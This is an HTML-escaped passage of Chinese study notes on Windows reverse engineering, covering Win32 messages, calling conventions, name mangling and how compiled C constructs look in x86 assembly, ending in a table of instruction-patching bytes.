&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;WM_COMMAND
	wNotifyCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HIWORD(wParam);		 &lt;span style=&#34;color:#75715e&#34;&gt;// 通告函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	wID &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LOWORD(wParam);				&lt;span style=&#34;color:#75715e&#34;&gt;// 菜单条目、控件或快捷键的标识符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	hwndCtl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (HWND) lParam;			&lt;span style=&#34;color:#75715e&#34;&gt;// 控件句柄
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：如果应用程序处理这条消息，则返回值为零&lt;/p&gt;
&lt;h5 id=&#34;wm_destory&#34;&gt;WM_DESTORY&lt;/h5&gt;
&lt;p&gt;当一个窗口被销毁时发送该消息。该消息对应 &lt;code&gt;0x02&lt;/code&gt;，没有参数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：如果应用程序处理这条消息，则返回值为零&lt;/p&gt;
&lt;h5 id=&#34;wm_gettext&#34;&gt;WM_GETTEXT&lt;/h5&gt;
&lt;p&gt;当需要将一个窗口的文本复制到一个由呼叫程序提供的缓冲区中时，发送该消息。该消息对应 &lt;code&gt;0x0D&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;WM_GETTEXT
	wParam &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (WPARAM) cchTextMax;	&lt;span style=&#34;color:#75715e&#34;&gt;// 需要复制的字符数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	lParam &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (LPARAM) lpszText;		&lt;span style=&#34;color:#75715e&#34;&gt;// 接收文本的缓冲区地址
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：被复制的字符数&lt;/p&gt;
&lt;h5 id=&#34;wm_quit&#34;&gt;WM_QUIT&lt;/h5&gt;
&lt;p&gt;当应用程序调用 &lt;code&gt;PostQuitMessage&lt;/code&gt; 时，生成 &lt;code&gt;WM_QUIT&lt;/code&gt;消息，对应 &lt;code&gt;0x12&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;WM_QUIT
	nExitCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;) wParam;		&lt;span style=&#34;color:#75715e&#34;&gt;// 退出代码
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;无&lt;strong&gt;返回值&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;wm_lbuttondown&#34;&gt;WM_LBUTTONDOWN&lt;/h5&gt;
&lt;p&gt;光标停在窗口客户区且点击左键时，发送此消息&lt;/p&gt;
&lt;p&gt;如果鼠标未捕捉，将下发给光标下的窗口，否则发送给捕获鼠标动作的窗口&lt;/p&gt;
&lt;p&gt;对应 &lt;code&gt;0x201&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;WM_LBUTTONDOWN
	fwkeys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; wParam;			&lt;span style=&#34;color:#75715e&#34;&gt;// key旗帜
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	xPos &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LOWORD(lParam);		&lt;span style=&#34;color:#75715e&#34;&gt;// 光标的水平位置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	yPos &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HIWORD(lParam);		&lt;span style=&#34;color:#75715e&#34;&gt;// 光标的垂直位置
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：如果应用程序处理了这条消息，返回值为零&lt;/p&gt;
&lt;h4 id=&#34;虚拟内存&#34;&gt;虚拟内存&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;应用程序不会直接访问物理地址&lt;/li&gt;
&lt;li&gt;虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问&lt;/li&gt;
&lt;li&gt;每个应用都有独立的寻址空间，不同应用程序的地址空间是彼此隔离的&lt;/li&gt;
&lt;li&gt;DLL程序没有私有空间，总是被映射到其他应用程序的地址空间中，作为程序的一部分运行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;动态分析技术&#34;&gt;动态分析技术&lt;/h2&gt;
&lt;h2 id=&#34;逆向分析技术&#34;&gt;逆向分析技术&lt;/h2&gt;
&lt;h3 id=&#34;win32&#34;&gt;Win32&lt;/h3&gt;
&lt;h4 id=&#34;启动&#34;&gt;启动&lt;/h4&gt;
&lt;p&gt;程序先执行启动代码，随后调用 &lt;code&gt;WinMain&lt;/code&gt; 函数&lt;/p&gt;
&lt;p&gt;实例中的系统调用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;Call KERNEL32.GetVersion              ; 确定Windows系统版本
Call KERNEL32.GetCommandLineA         ; 指向系统的完整命令行的指针
Call KERNEL32.GetStartupInfoA         ; 获取一个进程的启动信息
Call KERNEL32.GetModuleHandleA        ; 返回进程地址空间执行文件基地址
call 00401000                         ; 调用WinMain
call 004012EC                         ; 退出程序
ret
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;通常无需关注启动，直接查看 &lt;code&gt;WinMain&lt;/code&gt; 即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;函数调用&#34;&gt;函数调用&lt;/h4&gt;
&lt;p&gt;编译器通常使用 &lt;code&gt;call&lt;/code&gt; 和 &lt;code&gt;ret&lt;/code&gt; 指令来调用函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;call&lt;/code&gt; 指令将其之后的指令地址压入栈顶，&lt;code&gt;ret&lt;/code&gt; 指令则返回到调用位置&lt;/p&gt;
&lt;p&gt;有时可能利用寄存器进行间接调用，如： &lt;code&gt;call eax&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;参数传递&#34;&gt;参数传递&lt;/h4&gt;
&lt;h5 id=&#34;栈&#34;&gt;栈&lt;/h5&gt;
&lt;p&gt;调用函数时，将参数压入栈中&lt;/p&gt;
&lt;p&gt;对于不同语言，有不同的调用约定&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;C/C++(__cdecl)&lt;/th&gt;
&lt;th&gt;pascal&lt;/th&gt;
&lt;th&gt;stdcall&lt;/th&gt;
&lt;th&gt;fastcall&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;参数传递顺序&lt;/td&gt;
&lt;td&gt;从右向左&lt;/td&gt;
&lt;td&gt;从左向右&lt;/td&gt;
&lt;td&gt;从右向左&lt;/td&gt;
&lt;td&gt;使用寄存器和栈&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;平衡栈&lt;/td&gt;
&lt;td&gt;调用者&lt;/td&gt;
&lt;td&gt;子程序&lt;/td&gt;
&lt;td&gt;子程序&lt;/td&gt;
&lt;td&gt;子程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;VARARG&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;允许*&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;VARARG表示参数个数可以不确定&lt;/p&gt;
&lt;p&gt;stdcall中，如果参数个数不确定，需要由调用程序来平衡栈&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;程序执行过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;调用者将函数执行完毕时应返回的地址、参数压入栈&lt;/li&gt;
&lt;li&gt;函数使用 &lt;code&gt;ebp&lt;/code&gt; 指针+偏移量对栈中的参数进行寻址并取出，完成操作&lt;/li&gt;
&lt;li&gt;子程序使用 &lt;code&gt;ret&lt;/code&gt; 或 &lt;code&gt;retf&lt;/code&gt; 指令返回， &lt;code&gt;eip&lt;/code&gt; 置为栈中保存的地址，并继续执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;栈的建立过程（两个参数时）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先将 &lt;code&gt;arg2&lt;/code&gt; 压栈，&lt;code&gt;esp=K-04h&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;arg1&lt;/code&gt; 压栈，&lt;code&gt;esp=K-08h&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行 &lt;code&gt;call&lt;/code&gt; ，把返回地址压栈，&lt;code&gt;esp=K-0Ch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;为了程序能够恢复，将 &lt;code&gt;ebp&lt;/code&gt; 压栈，&lt;code&gt;esp=K-10h&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move ebp, esp&lt;/code&gt;，将当前的栈顶设置为栈底&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sub esp, 8&lt;/code&gt; ，定义局部变量，两个变量分别为 &lt;code&gt;[esp-4]&lt;/code&gt; 和 &lt;code&gt;[esp-8]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;函数结束时，&lt;code&gt;add esp, 8&lt;/code&gt; 释放局部变量占用，或者使用 &lt;code&gt;ret 8&lt;/code&gt; 来释放&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;还可以用enter和leave指令维护&lt;/p&gt;
&lt;p&gt;&lt;code&gt;enter&lt;/code&gt; 指令：&lt;code&gt;push ebp&lt;/code&gt;，&lt;code&gt;mov ebp, esp&lt;/code&gt;，&lt;code&gt;sub esp, xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;leave&lt;/code&gt; 指令：&lt;code&gt;add esp, xxx&lt;/code&gt;，&lt;code&gt;pop ebp&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;寄存器&#34;&gt;寄存器&lt;/h5&gt;
&lt;p&gt;通常遵循 &lt;code&gt;fastcall&lt;/code&gt; 规范&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VC++：左边两个参数分别存入 &lt;code&gt;ecx&lt;/code&gt;, &lt;code&gt;edx&lt;/code&gt; 中，其余压栈&lt;/li&gt;
&lt;li&gt;Borland Delphi/C++：左边三个参数分别存入 &lt;code&gt;eax&lt;/code&gt;, &lt;code&gt;edx&lt;/code&gt;, &lt;code&gt;ecx&lt;/code&gt; 中，其余按PASCAL方式压栈&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;C++非静态类成员默认调用 &lt;code&gt;thiscall&lt;/code&gt; ，对象的每个函数隐含接受 &lt;code&gt;this&lt;/code&gt; 参数，使用 &lt;code&gt;eax&lt;/code&gt; 存放，其余参数从右到左压栈&lt;/p&gt;
&lt;h5 id=&#34;名称修饰约定&#34;&gt;名称修饰约定&lt;/h5&gt;
&lt;p&gt;为了操作符和函数重载，C++编译器会按照规则修改入口点的符号名，从而允许同一个名字有多个用法。&lt;/p&gt;
&lt;p&gt;C的规则如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;stdcall调用约定在输出函数名前加下划线，在后面加@，格式为 &lt;code&gt;_functionname@number&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;__cdecl调用约定格式为 &lt;code&gt;_functionname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Fastcall调用约定格式位 &lt;code&gt;@functionname@number&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;均不改变大小写&lt;/p&gt;
&lt;p&gt;C++规则如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;stdcall调用约定以 &lt;code&gt;?&lt;/code&gt; 开头，函数名后以 &lt;code&gt;@@YG&lt;/code&gt; 标识参数表开始，后跟参数表，参数表第一项位返回值类型，其后依次为参数的数据类型，指针标识在其所指数据类型前，参数表后，以 &lt;code&gt;@Z&lt;/code&gt; 标识整个名字的结束，若无参数，则以 &lt;code&gt;Z&lt;/code&gt; 结束。格式为 &lt;code&gt;?functionname@@YG******@Z&lt;/code&gt; 或 &lt;code&gt;?functionname@@YG*XZ&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;__cdecl调用将 &lt;code&gt;@@YG&lt;/code&gt; 替换为 &lt;code&gt;@@YA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Fastcall调用将 &lt;code&gt;@@YG&lt;/code&gt; 替换为 &lt;code&gt;@@YI&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;返回值&#34;&gt;返回值&lt;/h4&gt;
&lt;h5 id=&#34;return操作返回&#34;&gt;return操作返回&lt;/h5&gt;
&lt;p&gt;存放在 &lt;code&gt;eax&lt;/code&gt; 寄存器中，高32位存放在 &lt;code&gt;edx&lt;/code&gt; 中&lt;/p&gt;
&lt;h5 id=&#34;传引用方式返回&#34;&gt;传引用方式返回&lt;/h5&gt;
&lt;p&gt;传引用调用方式将变量的地址传递给函数，可以在子函数中修改该内存单元中变量的值，因此允许修改原始变量&lt;/p&gt;
&lt;h4 id=&#34;数据结构&#34;&gt;数据结构&lt;/h4&gt;
&lt;h5 id=&#34;局部变量&#34;&gt;局部变量&lt;/h5&gt;
&lt;p&gt;函数内部定义的一个变量，作用域和生命周期仅局限于该函数内&lt;/p&gt;
&lt;h6 id=&#34;栈存放&#34;&gt;栈存放&lt;/h6&gt;
&lt;p&gt;先将参数压入栈中，再修改 &lt;code&gt;ebp&lt;/code&gt; ，最后减小 &lt;code&gt;esp&lt;/code&gt;。因此 &lt;code&gt;[ebp+**h]&lt;/code&gt; 表示参数， &lt;code&gt;[ebp-**h]&lt;/code&gt; 表示局部变量&lt;/p&gt;
&lt;h6 id=&#34;寄存器存放&#34;&gt;寄存器存放&lt;/h6&gt;
&lt;p&gt;有 6 个通用寄存器尽可能有效地存放局部变量， 因此需要注意确定当前的寄存器中存储的变量是哪个变量&lt;/p&gt;
&lt;h5 id=&#34;全局变量&#34;&gt;全局变量&lt;/h5&gt;
&lt;p&gt;局部变量存放在栈中，而全局变量存放在内存区中&lt;/p&gt;
&lt;p&gt;版本标记等常数通常为全局变量&lt;/p&gt;
&lt;p&gt;全局变量通常存放在数据区块 &lt;code&gt;.data&lt;/code&gt; 的一个固定地址处，程序使用固定的硬编码地址进行寻址&lt;/p&gt;
&lt;p&gt;如果在只读区块，说明是一个常量&lt;/p&gt;
&lt;h5 id=&#34;数组&#34;&gt;数组&lt;/h5&gt;
&lt;p&gt;一般通过基址+变址实现寻址，如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov eax, [407030h + eax]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;间接寻址一般用于给数组和结构赋值，&lt;code&gt;[base+n]&lt;/code&gt; 根据n的不同对结构中的相应单元赋值。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;0040101D lea esi, dword ptr [esp+8]
00401021 mov edi, 3
00401026 mov eas, dword ptr [esi]
...
00401036 add esi, 4
00401039 dec edi
0040103A jnz short 00401026
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;虚函数&#34;&gt;虚函数&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;C++面向对象中，最重要的概念就是虚函数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;虚函数是程序运行时定义的函数，其地址不能在编译时确定，只能在调用即将进行时确定。虚函数的引用存放在专用数组——虚函数表（Virtual Table，VTBL）中。&lt;/p&gt;
&lt;p&gt;调用时首先通过虚函数指针找到虚函数表的地址，然后在虚函数表中找到该函数的入口地址，最后进行调用。&lt;/p&gt;
&lt;h4 id=&#34;控制语句&#34;&gt;控制语句&lt;/h4&gt;
&lt;h5 id=&#34;if-else&#34;&gt;if-else&lt;/h5&gt;
&lt;p&gt;汇编形式通常为&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;cmp a, bjz  0040xxxxh  ; (jnz)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以用 &lt;code&gt;test eax, eax&lt;/code&gt; 替代 &lt;code&gt;cmp&lt;/code&gt; ，该语句（相当于逻辑与运算）表示当 &lt;code&gt;eax&lt;/code&gt; 为 0 时，设置 &lt;code&gt;ZF&lt;/code&gt; 为 1，&lt;code&gt;jz&lt;/code&gt; 则表示 &lt;code&gt;ZF&lt;/code&gt; 位为 1 时跳转&lt;/p&gt;
&lt;h5 id=&#34;switch-case&#34;&gt;switch-case&lt;/h5&gt;
&lt;p&gt;无优化版本&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;0040101D cmp [ebp-08], 01    ; case 100401021 je  0040103100401023 cmp [ebp-08], 02    ; case 200401027 je  0040104000401029 cmp [ebp-08], 0A    ; case 100040102D je  0040104F0040102F jmp 0040105E        ; default
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 &lt;code&gt;dec&lt;/code&gt; 指令替代 &lt;code&gt;cmp&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov eax, [esp+08]dec eax             ; case 1je  0040xxxxdec eax             ; case 2je  0040xxxxsub eax, 00000008   ; case 10je  0040xxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;跳转表实现（case的取值为算术级数时）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;jmp dword ptr [4*eax+004010B0]   ; 跳转表
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;转移指令机器码计算&#34;&gt;转移指令机器码计算&lt;/h5&gt;
&lt;p&gt;位移量=目的地址-起始地址-跳转指令长度&lt;/p&gt;
&lt;p&gt;转移指令机器码=转移类别机器码+位移量&lt;/p&gt;
&lt;p&gt;转移指令可以分为短转移，长转移和子程序调用（call）&lt;/p&gt;
&lt;p&gt;短转移2字节&lt;/p&gt;
&lt;p&gt;长转移无条件5字节，条件转移6字节&lt;/p&gt;
&lt;p&gt;call指令5字节&lt;/p&gt;
&lt;h5 id=&#34;条件设置指令&#34;&gt;条件设置指令&lt;/h5&gt;
&lt;p&gt;对于语句&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; c1 : c2;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;条件分支语句为&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;  cmp a, b  mov eax, c1  jl  L1  mov eax, c2L1:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用条件设置语句可以不包含条件分支&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;xor   eax, eaxcmp   a, bsetge al       ; if a &amp;gt;= b, al = 1, else al = 0dec   eaxand   eax, (c1 - c2)add   eax, c2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者使用条件传输指令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov   eax, c2cmp   a, bcmovl eax, cl
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;循环语句&#34;&gt;循环语句&lt;/h4&gt;
&lt;p&gt;通常使用 &lt;code&gt;ecx&lt;/code&gt; 寄存器作为计数器，例如&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;    xor ecx, ecx ; 计数器清空:L1	inc ecx	...	cmp ecx, 05  ; 循环退出条件	jbe L1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;优化后的循环实例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;    xor ecx, ecx    xor eax, eax:L1    add ecx, eax    inc eax    cmp eax, 64h    jle L1    xor eax, eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对应的源码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)    sum &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; i;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;数学运算&#34;&gt;数学运算&lt;/h4&gt;
&lt;h5 id=&#34;加减法&#34;&gt;加减法&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;add&lt;/code&gt; 和 &lt;code&gt;sub&lt;/code&gt; 指令，有时候可以使用 &lt;code&gt;lea&lt;/code&gt; 进行优化&lt;/p&gt;
&lt;p&gt;lea 允许一个时钟内计算 &lt;code&gt;lea edx, [eax+ecx+78h]&lt;/code&gt; 级别的运算&lt;/p&gt;
&lt;h5 id=&#34;乘法&#34;&gt;乘法&lt;/h5&gt;
&lt;p&gt;乘法使用 &lt;code&gt;mul&lt;/code&gt; 或 &lt;code&gt;imul&lt;/code&gt; 指令&lt;/p&gt;
&lt;p&gt;对于2的幂，使用 &lt;code&gt;shl&lt;/code&gt; 指令可以加快运算&lt;/p&gt;
&lt;p&gt;由于 &lt;code&gt;lea&lt;/code&gt; 指令可以实现乘 2, 4, 8 的运算，因此可以用来加快 3, 5, 6, 7, 9 等数字的乘法运算，如 &lt;code&gt;lea eax, [eax+eax*4]&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;除法&#34;&gt;除法&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;div&lt;/code&gt; 或 &lt;code&gt;idiv&lt;/code&gt; 指令&lt;/p&gt;
&lt;p&gt;对于2的幂，使用 &lt;code&gt;shr&lt;/code&gt; 指令加速，有符号时使用 &lt;code&gt;sar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此外可以利用乘法进行加速&lt;/p&gt;
&lt;p&gt;常见的优化公式为
$$
\dfrac{a}{b}=a\times \dfrac{1}{b}
$$
因此，$\div 11$ 可以优化为 $(\times 2E8BA2E9)&amp;raquo;(32+1)$&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov  eax, 2E8BA2E9imul ecxsar  edx, 1          ; edx中存放了乘法的高位双字节mov  ecx, edx
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;字符串&#34;&gt;字符串&lt;/h4&gt;
&lt;h5 id=&#34;字符串存储&#34;&gt;字符串存储&lt;/h5&gt;
&lt;p&gt;分为两种，一种使用结束符作为标识，一种记录长度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C语言：&lt;code&gt;String\0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;DOS字符串：&lt;code&gt;String$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;PASCAL：&lt;code&gt;\x05String&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Delphi：&lt;code&gt;\x05\x00String&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Go语言使用一个64位整型记录长度&lt;/p&gt;
&lt;h5 id=&#34;字符寻址指令&#34;&gt;字符寻址指令&lt;/h5&gt;
&lt;p&gt;mov将当前指令所在的内存复制并放到目的寄存器中，可操作常量或指针&lt;/p&gt;
&lt;p&gt;lea是装入有效地址，操作数是地址&lt;/p&gt;
&lt;p&gt;以下两条指令是等价的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;lea eax, [401000h]mov eax, 401000h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;都是将401000h写入eax寄存器中&lt;/p&gt;
&lt;p&gt;因此，以下两个指令也是等价的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;lea eax, [eax+8]add eax, 8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;常被编译器用来计算加法&lt;/p&gt;
&lt;h5 id=&#34;ascii大小写转换&#34;&gt;ASCII大小写转换&lt;/h5&gt;
&lt;p&gt;区别在于二进制的第五位，大写字母为0，小写字母为1&lt;/p&gt;
&lt;p&gt;因此有如下方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大小写转换：$\pm\ \mathrm{0x}20$，$\oplus\ \mathrm{0x}20$&lt;/li&gt;
&lt;li&gt;转大写：$&amp;amp;\ \mathrm{0b}11011111$&lt;/li&gt;
&lt;li&gt;转小写：$|\ \mathrm{0b}00100000$&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;计算长度&#34;&gt;计算长度&lt;/h5&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov ecx, FFFFFFFF  ; 这一句是一个重要特征xor eax, eax       ; 清零，原文为subrepnz              ; 复制串操作，直到ecx为0scasb              ; 串扫描指令，把al中的内容与edi指向的附加段中的数据逐一比较not ecx            ; ecx=字符长度+1dec ecx            ; ecx=字符长度je xxxxxx          ; 如果ecx为0，说明长度为0
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;指令修改技巧&#34;&gt;指令修改技巧&lt;/h4&gt;
&lt;p&gt;eax有优化，尽可能使用&lt;/p&gt;
&lt;p&gt;替换字节：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;指令字节长度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;nop&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;push eax + pop eax&lt;/td&gt;
&lt;td&gt;50 58&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
